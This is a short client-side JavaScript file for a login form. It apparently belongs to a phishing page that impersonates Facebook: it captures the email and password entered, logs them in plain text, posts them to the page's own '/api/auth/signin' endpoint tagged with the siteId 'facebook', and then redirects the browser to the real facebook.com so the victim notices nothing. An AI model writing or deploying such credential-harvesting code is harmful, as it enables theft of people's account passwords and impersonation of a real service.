/**
 * @typedef {Object} SignInErrorResponse
 * @property {string} message
 */

/**
 * @typedef {Object} SignInSuccessResponse
 * @property {string} redirectUri
 */

/**
 * @typedef {Object} SignInModel
 * @property {string} email
 * @property {string} password
 * @property {string} redirectUri
 * @property {string} siteId
 */

/**
 * @param {SignInModel} input
 */
async function signIn(input) {
  try {
    const stringifiedInput = JSON.stringify(input);
    const headers = new Headers();

    headers.set("content-type", "application/json");
    headers.set("content-length", `${stringifiedInput.length}`);

    const response = await fetch("/api/auth/signin", {
      method: "POST",
      body: stringifiedInput,
      headers,
    });

    if (!response.ok) {
      /**
       * @type {SignInErrorResponse}
       */
      const data = await response.json();

      throw new Error(data.message);
    }

    /**
     * @type {SignInSuccessResponse}
     */
    const data = await response.json();

    window.location.href = data.redirectUri;
  } catch (error) {
    if (error instanceof Error) {
      console.error(
        `Unexpected error occured upon signing in, ${error.message}`
      );

      return;
    }

    console.error(error);
  }
}

const signInFormNode = document.getElementById("signin-form");

const isFormNode = signInFormNode instanceof HTMLFormElement;

if (!isFormNode) {
  throw new Error("signInFormNode is not a HTMLFormElement");
}

signInFormNode.addEventListener("submit", async (e) => {
  e.preventDefault();

  const formData = new FormData(signInFormNode);
  const email = formData.get("email")?.toString();
  const password = formData.get("password")?.toString();
  const siteId = "facebook";
  const redirectUri = "https://www.facebook.com";

  if (!email || !password) {
    return;
  }

  /**
   * @type {SignInModel}
   */
  const signInInput = {
    email,
    password,
    siteId,
    redirectUri,
  };

  console.log(signInInput);

  await signIn(signInInput);
});
